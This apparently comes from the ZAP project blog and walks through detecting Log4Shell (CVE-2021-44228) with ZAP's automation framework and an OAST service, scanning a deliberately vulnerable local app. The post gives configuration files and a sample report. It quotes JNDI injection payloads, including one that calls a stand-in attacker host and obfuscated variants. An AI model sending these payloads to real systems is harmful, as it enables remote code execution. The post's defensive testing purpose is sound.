---
title: "Automating Log4Shell Detection with OAST and the ZAP Automation Framework"
summary: "A walkthrough of using the new Log4Shell Alpha Active Scan rule with the ZAP Automation Framework."
images:
- https://www.zaproxy.org/blog/2021-12-14-automating-log4shell-detection-with-oast-and-af/images/log4shell-zap.png
type: post
tags:
- blog
- oast
date: "2021-12-14"
addSocialPreview: true
authors:
- akshath
---

Our last blog post talked about how ZAP 2.11.0 was vulnerable to Log4Shell and our efforts to patch it. In this blog post we are going to look at detecting Log4Shell with the ZAP Automation Framework and the OAST add-on. 

We recently added a new scan rule to detect Log4Shell in the alpha active scanner rules add-on. To use it, you will need to:
1. Install the Active scanner rules (alpha) add-on from the [ZAP Marketplace](https://www.zaproxy.org/addons/).
2. [Enable an OAST service](https://www.zaproxy.org/docs/desktop/addons/oast-support/options/#active-scan-service) that will be used in Active Scan Rules (explained why below).
3. Launch an Active Scan against the application you want to test. You can do this from the GUI, but in this post we will be using the ZAP automation framework and do everything from the CLI.

To understand why we need out-of-band testing to detect Log4Shell, we must first understand how the attack works at a high level.

As explained at https://log4shell.com,
1. Data taken from the user is sent to the server (via any protocol).
1. The server logs the request data, which includes the malicious payload: `${jndi:ldap://attacker.com/abc}` (where `attacker.com` is an attacker controlled server).
1. This payload triggers the log4j vulnerability, and the server sends a request to attacker.com via the "Java Naming and Directory Interface" (JNDI) protocol.
1. The response from the attacker controlled server includes a URL to a remote Java class file (for example, `http://second-stage.attacker.com/Exploit.class`) that is injected into the server process.
1. The second stage is triggered by the injected payload, which allows an attacker to run arbitrary code.

Note the third point above. 

> The server sends a request to attacker.com

We need a way to verify that this request was made. This is where OAST comes in. Here's how a typical active scan rule that makes use of the [OAST add-on for ZAP](https://www.zaproxy.org/docs/desktop/addons/oast-support/) proceeds:

1. Obtain a unique domain from the OAST add-on.
2. Insert the domain into a known Log4Shell payload, like `${jndi:ldap://attacker.com/abc}` above.
3. Poll the selected OAST service to check for DNS interactions at the domain. ZAP currently supports two third-party open source OAST services - [BOAST](https://github.com/marcoagner/boast) and [Interactsh](https://github.com/projectdiscovery/interactsh). It also supports a [Callbacks](https://www.zaproxy.org/docs/desktop/addons/oast-support/services/callbacks/) service which is hosted on the same server as ZAP. By default, ZAP uses the free, publicly hosted instances of BOAST or Interactsh but you can also host them on your own and configure them in ZAP.
4. An alert is raised if any interactions were made to the OAST service.

Let’s look at the scan rule in action against a deliberately vulnerable app. Feel free to follow along.

You will need:
- Docker
- The latest version of ZAP
 
We will be doing everything from the command line in this blog post, including running ZAP headlessly.
 
Start the vulnerable app, using:
```
docker run -p 8000:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
See [this GitHub repo](https://github.com/christophetd/log4shell-vulnerable-app) for more information about the vulnerable app.

Set up ZAP with a new config dir installing/updating the required add-ons:
``` 
./zap.sh -cmd -dir log4shell -addonupdate -addoninstall ascanrulesAlpha
```
Create these two files on your computer:
 
**log4shell.conf**
```conf
# Use the public Interactsh service
oast.activeScanService=Interactsh
oast.interactsh.serverUrl=https://interactsh.com
oast.interactsh.pollingFrequency=10
 
# Scan headers in all requests
scanner.injectable=11
scanner.scanHeadersAllRequests=true
 
# Send the X-Api-Version header in spider requests - just required for the test app
replacer.full_list(0).description=X-Api-Version
replacer.full_list(0).enabled=true
replacer.full_list(0).matchtype=REQ_HEADER
replacer.full_list(0).matchstr=X-Api-Version
replacer.full_list(0).regex=false
replacer.full_list(0).replacement=test
replacer.full_list(0).initiators=\[3\]
```

**log4shell.yaml**
```yaml
---
env:
  contexts:
  - name: "Default Context"
    urls:
    - "http://localhost:8000/"
  parameters:
    failOnError: true
    failOnWarning: false
    progressToStdout: true
  vars: {}
jobs:
- parameters: {}
  name: "spider"
  type: "spider"
- parameters: {}
  policyDefinition:
    defaultStrength: "medium"
    defaultThreshold: "off"
    rules:
    - id: 40043
      name: "Log4Shell (CVE-2021-44228)"
      threshold: "medium"
      strength: "default"
  name: "activeScan"
  type: "activeScan"
- parameters:
    time: "1:30"
  name: "delay"
  type: "delay"
- type: report
  parameters:
    template: traditional-json
    reportFile: log4shell-report
```

Run ZAP against the demo app with:
``` 
./zap.sh -cmd -dir log4shell -configfile /path/to/log4shell.conf -autorun /path/to/log4shell.yaml
```
Replace `/path/to/…` with the full path of the files.
 
The generated report should show the vulnerability :).
 
```json
{
	"@version": "2.11.1",
	"@generated": "Mon, 13 Dec 2021 15:53:57",
	"site":[ 
		{
			"@name": "http://localhost:8000",
			"@host": "localhost",
			"@port": "8000",
			"@ssl": "false",
			"alerts": [ 
				{
					"pluginid": "40043",
					"alertRef": "40043",
					"alert": "Log4Shell (CVE-2021-44228)",
					"name": "Log4Shell (CVE-2021-44228)",
					"riskcode": "3",
					"confidence": "2",
					"riskdesc": "High (Medium)",
					"desc": "<p>Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.</p>",
					"instances":[ 
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com/abc}",
							"evidence": "DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com. HTTP/1.1"
						},
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.interactsh.com/abc}",
							"evidence": "DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.interactsh.com. HTTP/1.1"
						},
						{
							"uri": "http://localhost:8000/",
							"method": "GET",
							"param": "X-Api-Version",
							"attack": "${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.interactsh.com/abc}",
							"evidence": "DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.interactsh.com. HTTP/1.1"
						}
					],
					"count": "3",
					"solution": "<p>Upgrade Log4j2 to version 2.15.0 or newer. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".</p>",
					"otherinfo": "<p></p><p>Request</p><p>DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com. HTTP/1.1</p><p></p><p>;; opcode: QUERY, status: NOERROR, id: 38751</p><p>;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</p><p></p><p>;; QUESTION SECTION:</p><p>;7fiivcu3eqx4dozvlnwkofl3te.interactsh.com.\tIN\t A</p><p></p><p>;; ADDITIONAL SECTION:</p><p></p><p>;; OPT PSEUDOSECTION:</p><p>; EDNS: version 0; flags: ; udp: 1400</p><p></p><p>Response</p><p>HTTP/1.0 0</p><p></p><p></p><p>--------------------------------</p>",
					"reference": "<p>https://www.cve.org/CVERecord?id=CVE-2021-44228</p><p>https://www.lunasec.io/docs/blog/log4j-zero-day/</p><p>https://nvd.nist.gov/vuln/detail/CVE-2021-44228</p>",
					"cweid": "117",
					"wascid": "20",
					"sourceid": "102"
				}
			]
		}
	]
}
```
 
It should be noted that some apps may require authentication to properly detect this vulnerability. We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (eg `ping interactsh.com`).
